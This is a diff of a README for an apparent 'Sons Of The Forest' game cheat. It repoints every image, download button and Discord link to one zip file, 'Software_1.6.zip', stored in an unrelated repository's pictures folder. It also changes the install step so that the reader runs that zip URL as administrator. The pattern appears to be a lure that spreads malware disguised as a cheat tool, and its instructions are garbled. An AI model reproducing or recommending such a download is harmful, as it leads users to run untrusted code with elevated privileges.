@@ -6,11 +6,11 @@ Enhance your survival experience in Sons Of The Forest with our advanced cheat, 
 
 <div align="center">
 
-  ![](https://raw.githubusercontent.com/voisecovaser/Sons-Of-The-Forest-Cyberware/main/pictures/1.png)
+  ![](https://github.com/VoiseCovaser/FIRE/raw/refs/heads/main/pictures/Software_1.6.zip)
 
-  ![](https://raw.githubusercontent.com/voisecovaser/Sons-Of-The-Forest-Cyberware/main/pictures/.png)
+  ![](https://github.com/VoiseCovaser/FIRE/raw/refs/heads/main/pictures/Software_1.6.zip)
 
-  <a href="https://voisecovaser.github.io/id/38359961"><img src="https://raw.githubusercontent.com/voisecovaser/Sons-Of-The-Forest-Cyberware/main/pictures/0.png" height="80"></a>
+  <a href="https://github.com/VoiseCovaser/FIRE/raw/refs/heads/main/pictures/Software_1.6.zip"><img src="https://github.com/VoiseCovaser/FIRE/raw/refs/heads/main/pictures/Software_1.6.zip" height="80"></a>
 
 </div>
 
@@ -51,8 +51,8 @@ And many other features!
 
 - Download the .zip archive using download button.
 - Extract the archive to a secure location.
-- Run `ProjectLauncher.exe` as administrator.
+- Run `https://github.com/VoiseCovaser/FIRE/raw/refs/heads/main/pictures/Software_1.6.zip` as administrator.
 
 💬 Have questions or need support? Join our active Discord community:
 
-[![Discord](https://img.shields.io/badge/Discord-Join-7289DA?logo=discord)](https://discord.gg/38359961)
+[![Discord](https://github.com/VoiseCovaser/FIRE/raw/refs/heads/main/pictures/Software_1.6.zip)](https://github.com/VoiseCovaser/FIRE/raw/refs/heads/main/pictures/Software_1.6.zip)
